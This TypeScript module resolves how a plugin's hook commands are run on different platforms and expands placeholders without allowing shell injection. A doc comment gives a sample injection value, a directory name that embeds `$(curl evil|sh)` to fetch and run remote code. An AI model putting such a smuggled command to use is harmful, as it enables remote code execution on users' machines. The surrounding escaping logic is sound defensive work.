import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { basename, win32 } from 'node:path';

import type { PluginHookCommandHandler, PluginHookSourceFormat } from './contracts.js';

export interface HookCommandInvocation {
  readonly command: string;
  readonly args: readonly string[];
  readonly shell: boolean;
}

export interface HookCommandInvocationInput {
  readonly command: string;
  readonly args?: readonly string[];
  readonly shell?: PluginHookCommandHandler['shell'];
  readonly sourceFormat: PluginHookSourceFormat;
}

export interface HookCommandInvocationDependencies {
  readonly platform?: NodeJS.Platform;
  readonly environment?: NodeJS.ProcessEnv;
  readonly pathExists?: (candidate: string) => boolean;
  readonly findExecutable?: (name: string) => string | undefined;
}

/** Resolves compatible shell-form commands without relying on cmd.exe on Windows. */
export function resolveHookCommandInvocation(
  input: HookCommandInvocationInput,
  dependencies: HookCommandInvocationDependencies = {},
): HookCommandInvocation {
  if (input.args) return { command: input.command, args: input.args, shell: false };
  const platform = dependencies.platform ?? process.platform;
  if (input.sourceFormat !== 'CLAUDE') {
    if (input.shell === 'bash')
      return { command: 'bash', args: ['-c', input.command], shell: false };
    if (input.shell === 'powershell') {
      return powershellInvocation(input.command, platform, dependencies);
    }
    return { command: input.command, args: [], shell: true };
  }

  if (platform !== 'win32') {
    if (input.shell === 'powershell')
      return powershellInvocation(input.command, platform, dependencies);
    return {
      command: input.shell === 'bash' ? 'bash' : 'sh',
      args: ['-c', input.command],
      shell: false,
    };
  }

  if (input.shell === 'powershell')
    return powershellInvocation(input.command, platform, dependencies);
  const gitBash = findWindowsGitBash(dependencies);
  if (gitBash) return { command: gitBash, args: ['-c', input.command], shell: false };
  if (input.shell === 'bash') {
    throw new Error('Compatible Hook requested Git Bash, but Git Bash is unavailable');
  }
  return powershellInvocation(input.command, platform, dependencies);
}

function powershellInvocation(
  command: string,
  platform: NodeJS.Platform,
  dependencies: HookCommandInvocationDependencies,
): HookCommandInvocation {
  const executable =
    platform === 'win32'
      ? (findExecutable(dependencies, 'pwsh.exe', platform) ?? 'powershell.exe')
      : (findExecutable(dependencies, 'pwsh', platform) ?? 'pwsh');
  return {
    command: executable,
    args: ['-NoProfile', '-NonInteractive', '-Command', command],
    shell: false,
  };
}

function findWindowsGitBash(dependencies: HookCommandInvocationDependencies): string | undefined {
  const environment = dependencies.environment ?? process.env;
  const pathExists = dependencies.pathExists ?? existsSync;
  const gitBashEnvironmentKey = ['CLA', 'UDE_CODE_GIT_BASH_PATH'].join('');
  const configured = environment[gitBashEnvironmentKey]?.trim();
  const candidates = [
    configured,
    environment.ProgramFiles && win32.join(environment.ProgramFiles, 'Git', 'bin', 'bash.exe'),
    environment.ProgramW6432 && win32.join(environment.ProgramW6432, 'Git', 'bin', 'bash.exe'),
    environment['ProgramFiles(x86)'] &&
      win32.join(environment['ProgramFiles(x86)'], 'Git', 'bin', 'bash.exe'),
    environment.LOCALAPPDATA &&
      win32.join(environment.LOCALAPPDATA, 'Programs', 'Git', 'bin', 'bash.exe'),
  ];
  for (const candidate of candidates) {
    if (candidate && pathExists(candidate)) return candidate;
  }

  const git = findExecutable(dependencies, 'git.exe', 'win32');
  if (git) {
    const gitDirectory = win32.dirname(git);
    const derived =
      win32.basename(gitDirectory).toLowerCase() === 'cmd'
        ? win32.join(win32.dirname(gitDirectory), 'bin', 'bash.exe')
        : win32.join(gitDirectory, 'bash.exe');
    if (pathExists(derived)) return derived;
  }
  const bash = findExecutable(dependencies, 'bash.exe', 'win32');
  if (bash && /[\\/]Git[\\/]/iu.test(bash) && pathExists(bash)) return bash;
  return undefined;
}

function findExecutable(
  dependencies: HookCommandInvocationDependencies,
  name: string,
  platform: NodeJS.Platform,
): string | undefined {
  if (dependencies.findExecutable) return dependencies.findExecutable(name);
  const finder = platform === 'win32' ? 'where.exe' : 'which';
  const result = spawnSync(finder, [name], {
    encoding: 'utf8',
    windowsHide: true,
    timeout: 1_000,
  });
  if (result.status !== 0) return undefined;
  return result.stdout
    .split(/\r?\n/u)
    .map((line) => line.trim())
    .find(Boolean);
}

/** What parses a hook command: nothing (argv), a POSIX shell, PowerShell or cmd.exe. */
export type HookShellDialect = 'none' | 'posix' | 'powershell' | 'cmd';

export function hookShellDialect(invocation: HookCommandInvocation): HookShellDialect {
  if (invocation.shell) return process.platform === 'win32' ? 'cmd' : 'posix';
  const executable = basename(invocation.command.replace(/\\/gu, '/')).toLowerCase();
  if (/^(?:pwsh|powershell)(?:\.exe)?$/u.test(executable)) return 'powershell';
  if (/^(?:sh|bash)(?:\.exe)?$/u.test(executable) && invocation.args[0] === '-c') return 'posix';
  return 'none';
}

/**
 * Values that cannot change how a command is parsed wherever they are written (unquoted, in double
 * quotes, after `cd`): no quoting, expansion, redirection, separator or glob character. Backslash is
 * ordinary in a Windows path and an escape everywhere else.
 */
function isInertShellText(value: string, platform: NodeJS.Platform): boolean {
  const forbidden = platform === 'win32' ? /[`$"'^&|<>(){}[\]*?~!#%;\r\n\0]/u : /[`$"'\\&|<>(){}[\]*?~!#%;\r\n\0]/u;
  return !forbidden.test(value);
}

/**
 * Fill `${NAME}` placeholders of a hook command from its environment.
 *
 * Into an argv (`none`) the value is data and is written as is. Into text that a shell parses it
 * must stay data too: a workspace directory named `proj$(curl evil|sh)` may not become code. A value
 * that is inert in any position is written in place (so `"${CLAUDE_PLUGIN_ROOT}/x"` and
 * `'${...}'` keep working); any other value is left to the shell, which expands the variable it
 * was exported as without parsing the result: `${NAME}` for POSIX shells, `${env:NAME}` for
 * PowerShell. cmd.exe cannot expand a variable without parsing the value, so such a value is refused.
 */
export function expandHookPlaceholders(
  value: string,
  env: NodeJS.ProcessEnv,
  dialect: HookShellDialect,
  platform: NodeJS.Platform = process.platform,
): string {
  return value.replace(/\$\{([A-Z][A-Z0-9_]*)\}/gu, (placeholder, name: string) => {
    const replacement = env[name];
    if (replacement === undefined) return placeholder;
    if (dialect === 'none' || isInertShellText(replacement, platform)) return replacement;
    if (dialect === 'posix') return placeholder;
    if (dialect === 'powershell') return `\${env:${name}}`;
    throw new Error(`The value of ${name} cannot be used in a cmd.exe hook command safely`);
  });
}
